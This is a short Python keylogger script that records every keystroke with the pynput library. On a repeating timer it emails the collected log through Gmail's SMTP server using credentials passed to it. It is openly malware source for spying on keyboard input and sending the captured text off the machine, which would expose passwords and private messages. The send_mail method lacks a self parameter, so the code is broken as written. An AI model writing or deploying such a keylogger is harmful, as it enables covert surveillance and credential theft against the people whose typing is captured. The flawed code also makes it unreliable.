#!/usr/bin/env python

#need to install -> pip install pynput
import pynput.keyboard
import threading
import smtplib


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string
        
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        #print(self.email, self.password, "\n\n" + self.log)
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(email, password, message):
        try:       
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)
            server.quit()
            print("Email sent!")
        except Exception as e:
            print(f"error: {e}")

    def start(self):
        keyboad_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboad_listener:
            self.report()
            keyboad_listener.join()

